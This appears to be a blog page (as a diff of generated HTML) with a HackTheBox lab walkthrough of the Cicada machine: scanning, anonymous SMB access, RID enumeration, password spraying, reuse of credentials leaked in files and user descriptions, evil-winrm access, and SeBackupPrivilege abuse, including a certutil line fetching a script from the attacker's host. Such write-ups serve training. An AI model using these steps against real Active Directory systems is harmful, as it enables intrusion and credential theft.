@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HackTheBox Machine - Cicada - G.R</title>
+<meta name="description" content="IP: 10.10.11.35
+Nmap scan results for 10.10.11.35 machine. Parameters:
+`sV` - Probe open ports to determine service/version info &lsquo;sC&rsquo; - equivalent to &ndash;script=default &lsquo;Pn&rsquo; - Treat all hosts as online &ndash; skip host discovery &lsquo;&ndash;max-rate=1000&rsquo; - Send packets no faster than 1000 packets per second nmap -sV -sC -Pn 10.10.11.35 --max-rate=1000Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-18 10:22 &#43;04Nmap scan report for cicada.htb (10.10.11.35)Host is up (0.098s latency).Not shown: 989 filtered tcp ports (no-response)PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-18 13:22:50Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb| Not valid before: 2024-08-22T20:24:16|_Not valid after: 2025-08-22T20:24:16445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb| Not valid before: 2024-08-22T20:24:16|_Not valid after: 2025-08-22T20:24:16|_ssl-date: TLS randomness does not represent time3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb| Not valid before: 2024-08-22T20:24:16|_Not valid after: 2025-08-22T20:24:16|_ssl-date: TLS randomness does not represent time3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb| Not valid before: 2024-08-22T20:24:16|_Not valid after: 2025-08-22T20:24:16Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required| smb2-time: | date: 2024-11-18T13:23:35|_ start_date: N/A|_clock-skew: 6h59m59sService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 96.30 seconds We find out that 10.10.11.35 host has cicada.htb domain. The system has active SMB, LDAP, RPC over HTTP services enabled, which can be further studied and dissected for weaknesses and vulnerabilities. Listing NULL(unauthorized/anonymous) SMB SHARES">
+<meta name="author" content="Giorgi Rcheulishvili">
+<link rel="canonical" href="http://localhost:1313/archive/htb-cicada-analysis/">
+
+
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+<link rel="stylesheet" href="/css/pygments.css">
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+</head>
+<body>
+
+<div class="navbar navbar-default navbar-fixed-top" role="navigation">
+  <div class="container">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a href="/" class="navbar-brand">G.R</a>
+    </div>
+    <div class="collapse navbar-collapse navbar-ex1-collapse">
+      <ul class="nav navbar-nav">
+        
+          
+          <li><a href="/research/">Research</a></li>
+        
+          
+          <li><a href="/projects/">Projects</a></li>
+        
+          
+          <li class="active"><a href="/archive/">Archive</a></li>
+        
+          
+          <li><a href="/about/">About</a></li>
+        
+          
+          <li><a href="/manifesto/">Approach</a></li>
+        
+      </ul>
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            
+            
+            
+            
+            
+            
+            <li class="active"><a href="/archive/htb-cicada-analysis/" hreflang="en">EN</a></li>
+          
+            
+            
+            
+            
+            
+            
+              
+                
+                  
+                
+              
+              
+            
+            <li><a href="/ka/untranslated/?from=%2Farchive%2Fhtb-cicada-analysis%2F&amp;t=HackTheBox&#43;Machine&#43;-&#43;Cicada" hreflang="ka">ქარ</a></li>
+          
+        
+      </ul>
+    </div>
+  </div>
+</div>
+
+
+<div class="container">
+  <div class="row">
+    <div class="col-sm-9">
+      
+<ol class="breadcrumb">
+  <li><a href="/"><i class="fa fa-home"></i></a></li>
+  
+  <li><a href="/archive/">Archives</a></li>
+  
+  <li class="active">HackTheBox Machine - Cicada</li>
+</ol>
+
+      
+
+<article>
+  <header class="page-header">
+    <h1>HackTheBox Machine - Cicada</h1>
+  </header>
+
+  
+  <div class="panel panel-default">
+    <div class="panel-body post-info">
+      <span class="label label-success">8 min read</span>
+      
+      <span class="label label-default">Date</span>
+      <span class="published"><i class="fa fa-calendar"></i> <time datetime="2024-11-20">November 20, 2024</time></span>
+      
+      
+      <span class="label label-default">Category</span>
+      <a href="/archive/">Archives</a>
+      
+      
+    </div>
+  </div>
+  
+
+  <div class="entry-content">
+    <p>IP: 10.10.11.35</p>
+<p>Nmap scan results for 10.10.11.35 machine. </p>
+<p>Parameters:</p>
+<ul>
+<li>`sV` - Probe open ports to determine service/version info</li>
+<li>&lsquo;sC&rsquo; - equivalent to &ndash;script=default</li>
+<li>&lsquo;Pn&rsquo; - Treat all hosts as online &ndash; skip host discovery</li>
+<li>&lsquo;&ndash;max-rate=1000&rsquo; - Send packets no faster than 1000 packets per second</li>
+</ul>
+<pre tabindex="0"><code>nmap -sV -sC -Pn 10.10.11.35 --max-rate=1000
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-18 10:22 +04
+Nmap scan report for cicada.htb (10.10.11.35)
+Host is up (0.098s latency).
+Not shown: 989 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-18 13:22:50Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
+| Not valid before: 2024-08-22T20:24:16
+|_Not valid after:  2025-08-22T20:24:16
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
+| Not valid before: 2024-08-22T20:24:16
+|_Not valid after:  2025-08-22T20:24:16
+|_ssl-date: TLS randomness does not represent time
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
+| Not valid before: 2024-08-22T20:24:16
+|_Not valid after:  2025-08-22T20:24:16
+|_ssl-date: TLS randomness does not represent time
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb
+| Not valid before: 2024-08-22T20:24:16
+|_Not valid after:  2025-08-22T20:24:16
+Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2024-11-18T13:23:35
+|_  start_date: N/A
+|_clock-skew: 6h59m59s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 96.30 seconds
+</code></pre><ol>
+<li>We find out that 10.10.11.35 host has cicada.htb domain.</li>
+<li>The system has active SMB, LDAP, RPC over HTTP services enabled, which can be further studied and dissected for weaknesses and vulnerabilities.</li>
+</ol>
+<p>Listing NULL(unauthorized/anonymous) SMB SHARES</p>
+<pre tabindex="0"><code>&gt; smbclient --no-pass -L //10.10.11.35
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	DEV             Disk      
+	HR              Disk      
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	SYSVOL          Disk      Logon server share 
+</code></pre><p>After that I tried logging into these SMB shares. HR share was accessible without authorization and had a content inside.</p>
+<pre tabindex="0"><code>
+&gt; smbclient //10.10.11.35/HR -U &#34; &#34;%&#34; &#34;
+Try &#34;help&#34; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Thu Mar 14 16:29:09 2024
+  ..                                  D        0  Thu Mar 14 16:21:29 2024
+  Notice from HR.txt                  A     1266  Wed Aug 28 21:31:48 2024
+
+&gt; smb: \&gt; recurse ON
+&gt; smb: \&gt; mget *
+Get file Notice from HR.txt? yes
+getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)
+</code></pre><p>The contents of the file `Notice From HR.txt` included a message from the HR notifying the new employee about their default password, although username was not mentioned.</p>
+<p>user default password: <code>Cicada$M6Corpb*@Lp#nZp!8</code></p>
+<p>now i need to guess which user&rsquo;s password is this.</p>
+<p>I&rsquo;m going to enumerate users by Brute-forcing RID&rsquo;s using NetExec tool</p>
+<pre tabindex="0"><code>&gt; nxc smb 10.10.11.35  -u guest -p &#39;&#39; --rid-brute
+OR
+&gt; nxc smb 10.10.11.35  -u none -p &#39;&#39; --rid-brute
+</code></pre><p>Both of the above produces the same result</p>
+<pre tabindex="0"><code>SMB  10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+SMB  10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest: 
+SMB  10.10.11.35     445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB  10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
+SMB  10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
+SMB  10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
+SMB  10.10.11.35     445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
+SMB  10.10.11.35     445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
+SMB  10.10.11.35     445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
+SMB  10.10.11.35     445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
+SMB  10.10.11.35     445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
+SMB  10.10.11.35     445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
+SMB  10.10.11.35     445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
+SMB  10.10.11.35     445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
+SMB  10.10.11.35     445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
+SMB  10.10.11.35     445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
+SMB  10.10.11.35     445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
+SMB  10.10.11.35     445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
+SMB  10.10.11.35     445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
+SMB  10.10.11.35     445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
+SMB  10.10.11.35     445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
+SMB  10.10.11.35     445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB  10.10.11.35     445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
+SMB  10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
+SMB  10.10.11.35     445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
+SMB  10.10.11.35     445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
+SMB  10.10.11.35     445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
+SMB  10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
+SMB  10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
+SMB  10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
+SMB  10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
+SMB  10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
+SMB  10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
+</code></pre><p>Then i used AWK to get usernames separately for brute-forcing.</p>
+<pre tabindex="0"><code>&gt; cat enum_accs.txt | awk &#39;{print $6}&#39; &gt; users.txt
+&gt; cat users.txt | awk -F &#34;\\&#34; &#39;{print $2}&#39; &gt; usernames.txt
+</code></pre><p>Which produces</p>
+<pre tabindex="0"><code>guest:
+Enterprise
+Administrator
+Guest
+krbtgt
+Domain
+Domain
+Domain
+Domain
+Domain
+Cert
+Schema
+Enterprise
+Group
+Read-only
+Cloneable
+Protected
+Key
+Enterprise
+RAS
+Allowed
+Denied
+CICADA-DC$
+DnsAdmins
+DnsUpdateProxy
+Groups
+john.smoulder
+sarah.dantelia
+michael.wrightson
+david.orelious
+Dev
+emily.oscars
+</code></pre><p>Next i pass enumerated users and known passwords and see which account matches this password</p>
+<pre tabindex="0"><code>&gt; nxc smb 10.10.11.35 -u enum_users.txt -p &#39;Cicada$M6Corpb*@Lp#nZp!8&#39; --continue-on-success
+</code></pre><p>michael.wrightson account was a match.</p>
+<p>Then we test user connection by listing network shares as an authorized user</p>
+<pre tabindex="0"><code>&gt; smbclient -L 10.10.11.35 -W cicada.htb -U michael.wrightson.
+</code></pre><p>And it works!</p>
+<p>Then, let&rsquo;s go ahead and login to RPC client as an authorized user and see what we can do or act on.</p>
+<pre tabindex="0"><code>rpcclient 10.10.11.35 -U michael.wrightson%&#39;Cicada$M6Corpb*@Lp#nZp!8&#39; -W cicada.htb
+</code></pre><p>And we got access to RPC session as an authorized user.</p>
+<p>Now let&rsquo;s enumerate available users and groups on the system</p>
+<pre tabindex="0"><code>rpcclient $&gt; enumdomusers 
+	user:[Administrator] rid:[0x1f4]
+	user:[Guest] rid:[0x1f5]
+	user:[krbtgt] rid:[0x1f6]
+	user:[john.smoulder] rid:[0x450]
+	user:[sarah.dantelia] rid:[0x451]
+	user:[michael.wrightson] rid:[0x452]
+	user:[david.orelious] rid:[0x454]
+	user:[emily.oscars] rid:[0x641]
+
+rpcclient $&gt; enumdomgroups
+	group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
+	group:[Domain Admins] rid:[0x200]
+	group:[Domain Users] rid:[0x201]
+	group:[Domain Guests] rid:[0x202]
+	group:[Domain Computers] rid:[0x203]
+	group:[Domain Controllers] rid:[0x204]
+	group:[Schema Admins] rid:[0x206]
+	group:[Enterprise Admins] rid:[0x207]
+	group:[Group Policy Creator Owners] rid:[0x208]
+	group:[Read-only Domain Controllers] rid:[0x209]
+	group:[Cloneable Domain Controllers] rid:[0x20a]
+	group:[Protected Users] rid:[0x20d]
+	group:[Key Admins] rid:[0x20e]
+	group:[Enterprise Key Admins] rid:[0x20f]
+	group:[DnsUpdateProxy] rid:[0x44e]
+	group:[Groups] rid:[0x44f]
+	group:[Dev Support] rid:[0x455]
+</code></pre><p>After querying each user I came across david.orelious Description. It contains users comment, which contains the password of the user.</p>
+<pre tabindex="0"><code>rpcclient $&gt; queryuser david.orelious
+		User Name   :	david.orelious
+	Full Name   :	
+	Home Drive  :	
+	Dir Drive   :	
+	Profile Path:	
+	Logon Script:	
+	Description :	Just in case I forget my password is aRt$Lp#7t*VQ!3
+	Workstations:	
+	Comment     :	
+	Remote Dial :
+	Logon Time               :	Fri, 15 Mar 2024 10:32:22 +04
+	Logoff Time              :	Thu, 01 Jan 1970 04:00:00 +04
+	Kickoff Time             :	Thu, 14 Sep 30828 06:48:05 +04
+	Password last set Time   :	Thu, 14 Mar 2024 16:17:30 +04
+	Password can change Time :	Fri, 15 Mar 2024 16:17:30 +04
+	Password must change Time:	Thu, 14 Sep 30828 06:48:05 +04
+	unknown_2[0..31]...
+	user_rid :	0x454
+	group_rid:	0x201
+	acb_info :	0x00000210
+	fields_present:	0x00ffffff
+	logon_divs:	168
+	bad_password_count:	0x00000000
+	logon_count:	0x00000000
+	padding1[0..7]...
+	logon_hrs[0..21]...
+</code></pre><p>Now, I can login to SMB DEV share with this account.</p>
+<pre tabindex="0"><code>smbclient //10.10.11.35/DEV -U david.orelious%&#39;aRt$Lp#7t*VQ!3&#39; -W cicada.htb
+</code></pre><p>Once session is established, we can see the ps1 script present on the share.</p>
+<pre tabindex="0"><code>smb: \&gt; dir
+  .                                   D        0  Thu Mar 14 16:31:39 2024
+  ..                                  D        0  Thu Mar 14 16:21:29 2024
+  Backup_script.ps1                   A      601  Wed Aug 28 21:28:22 2024
+
+		4168447 blocks of size 4096. 431820 blocks available
+smb: \&gt; get Backup_script.ps1 
+getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (1.6 KiloBytes/sec) (average 1.6 KiloBytes/sec)
+</code></pre><p>Let&rsquo;s examine <code>Backup_script.ps1</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ps1" data-lang="ps1"><span class="line"><span class="cl"><span class="nv">$username</span> <span class="p">=</span> <span class="s2">&#34;emily.oscars&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$password</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s2">&#34;Q!3@Lp#M6b*7t*Vt&#34;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$credentials</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Management</span><span class="p">.</span><span class="py">Automation</span><span class="p">.</span><span class="py">PSCredential</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dateStamp</span> <span class="p">=</span> <span class="nb">Get-Date</span> <span class="n">-Format</span> <span class="s2">&#34;yyyyMMdd_HHmmss&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$backupFileName</span> <span class="p">=</span> <span class="s2">&#34;smb_backup_</span><span class="nv">$dateStamp</span><span class="s2">.zip&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$backupFilePath</span> <span class="p">=</span> <span class="nb">Join-Path</span> <span class="n">-Path</span> <span class="nv">$destinationDirectory</span> <span class="n">-ChildPath</span> <span class="nv">$backupFileName</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Compress-Archive</span> <span class="n">-Path</span> <span class="nv">$sourceDirectory</span> <span class="n">-DestinationPath</span> <span class="nv">$backupFilePath</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Write-Host</span> <span class="s2">&#34;Backup completed successfully. Backup file saved to: </span><span class="nv">$backupFilePath</span><span class="s2">&#34;</span>
+</span></span></code></pre></div><p>The script reveals another user&rsquo;s information. Namely, <code>emily.oscars</code> password is <code>Q!3@Lp#M6b*7t*Vt</code></p>
+<p>then I logged into Emily&rsquo;s user account in SMB</p>
+<pre tabindex="0"><code>smbclient //10.10.11.35/C$ -U emily.oscars%&#39;Q!3@Lp#M6b*7t*Vt&#39; -W cicada.htb
+</code></pre><p>and retrieved an user.txt flag from</p>
+<p><code>C:\Users\emily.oscars.CICADA\Desktop\user.txt</code></p>
+<hr>
+<p>Up until this point I got by without any help. Then I got stuck and looked up other people&rsquo;s approaches.</p>
+<p>I got remote interactive shell access with <code>evil-winrm</code> to emily&rsquo;s user account.</p>
+<pre tabindex="0"><code>evil-winrm -i 10.10.11.35 -u &#39;emily.oscars&#39; -p &#39;Q!3@Lp#M6b*7t*Vt&#39;
+</code></pre><p>I found out that emily.oscars has a permission <code>SeBackupPrivilege</code> which can be used to gain read access on any file on the system.</p>
+<p>here&rsquo;s a script that allows just that: <a href="https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1">https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1</a></p>
+<p>Then I got this script uploaded to emily&rsquo;s workstation, which was hosted on my machine using python HTTP server.</p>
+<pre tabindex="0"><code>certutil -urlcache -f http://10.10.14.167/privesc.ps1 privesc.ps1
+</code></pre><p>Last step is to activate the script and read administrator folder.</p>
+<pre tabindex="0"><code>*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop&gt; . ./privesc.ps1
+
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop&gt; Acl-FullControl -user cicada\emily.oscars -path C:\users\administrator\desktop
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cat root.txt
+</code></pre><p><strong>user.txt - Acquired</strong> </p>
+<p><strong>root.txt - Acquired</strong></p>
+<p>Cicada machine has been pwned.</p>
+
+  </div>
+</article>
+
+    </div>
+    <div class="col-sm-3" id="sidebar">
+      <aside>
+
+
+<div id="aboutme">
+  <p><img class="img-thumbnail" src="http://localhost:1313/images/logo.png" alt="Giorgi Rcheulishvili"></p>
+  <p><strong>About Me: Giorgi Rcheulishvili</strong><br>Systems and infrastructure engineering - automation, containerization, and offensive security.</p>
+</div>
+
+
+<section class="well well-sm">
+  <ul class="list-group">
+
+    
+    <li class="list-group-item">
+      <h4>Social</h4>
+      <a href="https://github.com/grcheulishvili" target="_blank" rel="noopener"><i class="fa fa-github-square fa-lg"></i></a> 
+      <a href="https://www.linkedin.com/in/giorgi-rcheulishvili-bba988260/" target="_blank" rel="noopener"><i class="fa fa-linkedin-square fa-lg"></i></a>
+    </li>
+    
+
+    
+    
+    <li class="list-group-item">
+      <h4>Recent Posts</h4>
+      <ul class="list-group">
+        
+        <li class="list-group-item"><a href="/about/">Technical Biography</a></li>
+        
+        <li class="list-group-item"><a href="/manifesto/">Engineering Philosophy</a></li>
+        
+        <li class="list-group-item"><a href="/research/building-a-polymorphic-engine/">Polymorphic Engine Development</a></li>
+        
+        <li class="list-group-item"><a href="/research/stack-mechanics-and-overflows/">The Mechanical Inevitability of Buffer Overflows</a></li>
+        
+        <li class="list-group-item"><a href="/archive/ssrf-exploitation/">Research: Server-Side Request Forgery (SSRF) Mechanics</a></li>
+        
+      </ul>
+    </li>
+    
+
+    
+    <li class="list-group-item">
+      <h4>Categories</h4>
+      <ul class="list-group">
+        
+        <li class="list-group-item"><a href="/research/">Research <span class="badge">3</span></a></li>
+        
+        <li class="list-group-item"><a href="/archive/">Archives <span class="badge">18</span></a></li>
+        
+        <li class="list-group-item"><a href="/projects/">Projects <span class="badge">3</span></a></li>
+        
+        <li class="list-group-item"><a href="/engineering/">Engineering <span class="badge">1</span></a></li>
+        
+      </ul>
+    </li>
+    
+
+    
+    <li class="list-group-item">
+      <h4>Tags</h4>
+      <div class="tag-cloud">
+        
+        <a href="/tags/assembly" class="tag-2">assembly</a>
+        
+        <a href="/tags/c2" class="tag-2">c2</a>
+        
+        <a href="/tags/ctfd" class="tag-2">ctfd</a>
+        
+        <a href="/tags/cti" class="tag-2">cti</a>
+        
+        <a href="/tags/databases" class="tag-2">databases</a>
+        
+        <a href="/tags/devsecops" class="tag-2">devsecops</a>
+        
+        <a href="/tags/docker" class="tag-2">docker</a>
+        
+        <a href="/tags/elk" class="tag-2">elk</a>
+        
+        <a href="/tags/engineering" class="tag-2">engineering</a>
+        
+        <a href="/tags/go" class="tag-2">go</a>
+        
+        <a href="/tags/grafana" class="tag-2">grafana</a>
+        
+        <a href="/tags/hardening" class="tag-2">hardening</a>
+        
+        <a href="/tags/infrastructure" class="tag-2">infrastructure</a>
+        
+        <a href="/tags/internals" class="tag-2">internals</a>
+        
+        <a href="/tags/linux" class="tag-2">linux</a>
+        
+        <a href="/tags/maldev" class="tag-2">maldev</a>
+        
+        <a href="/tags/monitoring" class="tag-2">monitoring</a>
+        
+        <a href="/tags/network-security" class="tag-2">network security</a>
+        
+        <a href="/tags/pentesting" class="tag-2">pentesting</a>
+        
+        <a href="/tags/portswigger" class="tag-2">portswigger</a>
+        
+        <a href="/tags/postgresql" class="tag-2">postgresql</a>
+        
+        <a href="/tags/python" class="tag-2">python</a>
+        
+        <a href="/tags/rce" class="tag-2">rce</a>
+        
+        <a href="/tags/red-team" class="tag-2">red team</a>
+        
+        <a href="/tags/research" class="tag-2">research</a>
+        
+        <a href="/tags/reverse-engineering" class="tag-2">reverse engineering</a>
+        
+        <a href="/tags/sqli" class="tag-2">sqli</a>
+        
+        <a href="/tags/ssrf" class="tag-2">ssrf</a>
+        
+        <a href="/tags/web-security" class="tag-2">web security</a>
+        
+      </div>
+    </li>
+    
+
+    
+    
+    
+    
+    <li class="list-group-item">
+      <h4>Archives</h4>
+      <ul class="list-group">
+        
+        <li class="list-group-item">2025</li>
+        
+        <li class="list-group-item">2024</li>
+        
+      </ul>
+    </li>
+    
+
+  </ul>
+</section>
+</aside>
+
+    </div>
+  </div>
+</div>
+
+<footer>
+  <div class="container">
+    <hr>
+    <div class="row">
+      <div class="col-xs-10">
+        &copy; 2026 Giorgi Rcheulishvili
+        &middot; Powered by
+        <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a>,
+        <a href="https://getbootstrap.com/docs/3.4/" target="_blank" rel="noopener">Bootstrap</a>,
+        theme styled after
+        <a href="https://github.com/getpelican/pelican-themes/tree/master/pelican-bootstrap3" target="_blank" rel="noopener">pelican-bootstrap3</a>
+      </div>
+      <div class="col-xs-2">
+        <p class="pull-right"><i class="fa fa-arrow-up"></i> <a href="#">Back to top</a></p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+<script src="/js/jquery.min.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+</body>
+</html>
